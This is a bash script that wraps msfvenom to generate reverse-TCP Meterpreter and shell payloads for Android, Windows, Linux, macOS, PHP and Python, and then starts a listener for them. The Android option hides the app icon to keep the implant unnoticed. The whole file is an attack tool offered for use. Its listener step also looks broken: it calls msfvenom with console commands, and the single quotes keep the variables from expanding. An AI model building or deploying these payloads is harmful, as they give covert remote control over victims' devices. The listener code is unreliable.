#!/bin/bash
#coded by Sayuk Beast

#requirements
logo(){
echo ' ____                    _    ____                 _'
sleep 0.03
echo '/ ___|  __ _ _   _ _   _| | _| __ )  ___  __ _ ___| |_'
sleep 0.03
echo '\___ \ / _` | | | | | | | |/ /  _ \ / _ \/ _` / __| __|'
sleep 0.03
echo ' ___) | (_| | |_| | |_| |   <| |_) |  __/ (_| \__ \ |_'
sleep 0.03
echo '|____/ \__,_|\__, |\__,_|_|\_\____/ \___|\__,_|___/\__|'
sleep 0.03
echo '             |___/'
sleep 0.03
echo 'Do Not Copy This Code Without My Permission'
sleep 0.03
echo ' Please Apreciate My Hard Work'
sleep 0.03
echo
}
list(){
echo '===================================='
echo ' 1 = Android'
echo ' 2 = windows'
echo ' 3 = linux'
echo ' 4 = mac'
echo ' 5 = php'
echo ' 6 = python'
echo '===================================='
}
#starting
clear
logo
echo -e 'Do You Want To Start Payload-Generator?'
echo 'y/n'
read ask_start
if [ $ask_start = 'y' ]; then
   echo 'Loading...'
   sleep 1
   clear
   logo
   echo 'IP :'
   read ip
   echo 'Port :'
   read port
   echo 'Payload Name :'
   read pn
   echo 'Loading...'
   sleep 1
   clear
   logo
   list
   echo 'Choose Your Option :'
   read co
   if [ $co = '1' ]; then
      echo 'Creating Payload'
      msfvenom -p android/meterpreter/reverse_tcp AndroidHideAppIcon=true AndroidMeterpreterDebug=true AndroidWakelock=true lhost=$ip lport=$port -o /$pn
      echo 'Payload Created'
      echo 'Do You Want To Start Listener?'
        echo 'y/n'
        read start_listener
        if [ $start_listener = 'y' ]; then
           msfvenom -q -x 'use exploit/multi/handler;
           set payload android/meterpreter/reverse_tcp;
           set lhost $ip;
           set lport $port;
           exploit'
        fi
   elif [ $co = '2' ]; then
        echo 'Creating Payload'
        msfvenom -p windows/meterpreter/reverse_tcp lhost=$ip lport=$port -o /$pn
        echo 'Payload Created'
        echo 'Do You Want To Start Listener?'
        echo 'y/n'
        read start_listener
        if [ $start_listener = 'y' ]; then
           msfvenom -q -x 'use exploit/multi/handler;
           set payload windows/meterpreter/reverse_tcp;
           set lhost $ip;
           set lport $port;
           exploit'
        fi
   elif [ $co = '3' ]; then
        echo 'Creating Payload'
        msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=$ip lport=$port -o /$pn
        echo 'Payload Created'
        echo 'Do You Want To Start Listener?'
        echo 'y/n'
        read start_listener
        if [ $start_listener = 'y' ]; then
           msfvenom -q -x 'use exploit/multi/handler;
           set payload linux/x86/meterpreter/reverse_tcp;
           set lhost $ip;
           set lport $port;
           exploit'
        fi
   elif [ $co = '4' ]; then
        echo 'Creating Payload'
        msfvenom -p osx/x86/shell_reverse_tcp lhost=$ip lport=$port -o /$pn
        echo 'Payload Created'
        echo 'Do You Want To Start Listener?'
        echo 'y/n'
        read start_listener
        if [ $start_listener = 'y' ]; then
           msfvenom -q -x 'use exploit/multi/handler;
           set payload osx/x86/shell_reverse_tcp;
           set lhost $ip;
           set lport $port;
           exploit'
        fi
   elif [ $co = '5' ]; then
        echo 'Creating Payload'
        msfvenom -p php/meterpreter/reverse_tcp lhost=$ip lport=$port -o /$pn
        echo 'Payload Created'
        echo 'Do You Want To Start Listener?'
        echo 'y/n'
        read start_listener
        if [ $start_listener = 'y' ]; then
           msfvenom -q -x 'use exploit/multi/handler;
           set payload php/meterpreter/reverse_tcp;
           set lhost $ip;
           set lport $port;
           exploit'
        fi
   elif [ $co = '6' ]; then
        echo 'Creating Payload'
        msfvenom -p python/meterpreter/reverse_tcp lhost=$ip lport=$port -o /$pn
        echo 'Payload Created'
        echo 'Do You Want To Start Listener?'
        echo 'y/n'
        read start_listener
        if [ $start_listener = 'y' ]; then
           msfvenom -q -x 'use exploit/multi/handler;
           set payload python/meterpreter/reverse_tcp;
           set lhost $ip;
           set lport $port;
           exploit'
        fi
   else
     echo 'No Such Option'
   fi
else
  echo 'Thanks For Using This Payload-Generator'
fi
